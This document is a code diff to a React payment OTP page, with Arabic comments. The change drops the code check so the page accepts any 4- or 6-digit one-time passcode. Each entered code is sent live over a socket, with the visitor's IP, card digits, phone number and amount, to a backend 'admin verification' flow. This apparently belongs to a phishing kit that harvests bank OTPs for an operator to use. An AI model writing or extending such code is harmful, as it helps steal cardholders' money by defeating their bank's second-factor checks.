@@ -119,39 +119,29 @@ export default function PaymentOTP() {
     setIsVerifying(true);
     setError('');
 
-    // محاكاة التحقق من الرمز
+    // قبول أي رمز OTP مكون من 4 أو 6 أرقام
     setTimeout(() => {
-      // في التطبيق الحقيقي، سيتم التحقق من الرمز عبر Backend
-      const correctOtp = '123456'; // للتجربة فقط
-      
-      if (otpCode === correctOtp) {
-        // إرسال OTP للباكند
-        if (socket) {
-          socket.emit('submitOTP', {
-            ip: sessionStorage.getItem('userIP') || 'unknown',
-            otpCode,
-            cardLastDigits,
-            phoneNumber,
-            amount,
-            timestamp: new Date().toISOString()
-          });
-        }
-
-        // نجح التحقق - الذهاب لصفحة التحقق من الأدمن
-        navigate('/otp-verification', {
-          state: {
-            otpCode,
-            cardLastDigits,
-            phoneNumber,
-            amount
-          }
+      // إرسال OTP للباكند
+      if (socket) {
+        socket.emit('submitOTP', {
+          ip: sessionStorage.getItem('userIP') || 'unknown',
+          otpCode,
+          cardLastDigits,
+          phoneNumber,
+          amount,
+          timestamp: new Date().toISOString()
         });
-      } else {
-        // فشل التحقق
-        setError('رمز التحقق غير صحيح، يرجى المحاولة مرة أخرى');
-        setOtp(Array(otpLength).fill(''));
-        document.getElementById('otp-0')?.focus();
       }
+
+      // الذهاب لصفحة التحقق من الأدمن (قبول أي رقم)
+      navigate('/otp-verification', {
+        state: {
+          otpCode,
+          cardLastDigits,
+          phoneNumber,
+          amount
+        }
+      });
       
       setIsVerifying(false);
     }, 1500);
